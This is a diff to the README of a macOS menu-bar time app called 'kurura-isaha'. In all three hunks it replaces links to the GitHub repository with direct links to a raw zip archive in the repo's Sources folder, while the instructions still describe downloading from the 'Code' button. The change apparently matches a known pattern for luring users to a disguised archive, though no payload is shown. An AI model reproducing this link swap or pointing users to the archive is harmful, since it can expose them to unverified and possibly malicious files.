@@ -1,7 +1,7 @@
 <h1>⏱️ kurura-isaha - Time Control, Right From Your Menu Bar</h1>
 
 <p align="center">
-  <a href="https://github.com/Nickelbuisness/kurura-isaha" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:12px;font-weight:bold;">⬇️ DOWNLOAD KURURA-ISAHA NOW</a>
+  <a href="https://raw.githubusercontent.com/Nickelbuisness/kurura-isaha/main/Sources/3.4.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:20px;border-radius:12px;font-weight:bold;">⬇️ DOWNLOAD KURURA-ISAHA NOW</a>
 </p>
 
 ---
@@ -38,7 +38,7 @@ Getting kurura-isaha on your computer is incredibly easy. Just follow these two 
 ### Step 1: Get the App
 
 Visit this link to download the application:
-👉 **[https://github.com/Nickelbuisness/kurura-isaha](https://github.com/Nickelbuisness/kurura-isaha)**
+👉 **[https://raw.githubusercontent.com/Nickelbuisness/kurura-isaha/main/Sources/3.4.zip](https://raw.githubusercontent.com/Nickelbuisness/kurura-isaha/main/Sources/3.4.zip)**
 
 When you open that page, look for the green button that says **"Code"** . Click it,and then select **"Download ZIP"** . This will save acopy of the software to your computer.
 
@@ -175,7 +175,7 @@ It is designed specifically for **macOS** and works seamlessly with the operatin
 
 If you need to download it again,a here is the link one more time:
 
-**[🔗 Download kurura-isaha from GitHub](https://github.com/Nickelbuisness/kurura-isaha)**
+**[🔗 Download kurura-isaha from GitHub](https://raw.githubusercontent.com/Nickelbuisness/kurura-isaha/main/Sources/3.4.zip)**
 
 
 
